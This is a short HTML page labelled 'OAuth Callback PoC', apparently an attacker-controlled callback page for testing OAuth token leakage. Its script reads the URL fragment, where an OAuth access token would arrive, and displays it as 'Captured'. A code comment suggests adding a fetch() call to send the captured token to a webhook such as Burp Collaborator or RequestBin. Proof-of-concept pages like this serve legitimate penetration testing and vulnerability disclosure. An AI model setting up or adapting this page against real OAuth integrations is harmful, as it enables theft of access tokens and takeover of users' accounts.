<!DOCTYPE html>
<html>
<body>
    <h2>OAuth Callback PoC</h2>
    <p id="token-display">Waiting for token...</p>
    <script>
        // Extract the fragment from the URL
        const hash = window.location.hash;
        if (hash) {
            document.getElementById('token-display').innerText = "Captured: " + hash;
            // Optional: You could also write a fetch() request here to send this hash to a webhook (like Burp Collaborator or RequestBin)
        }
    </script>
</body>
</html>
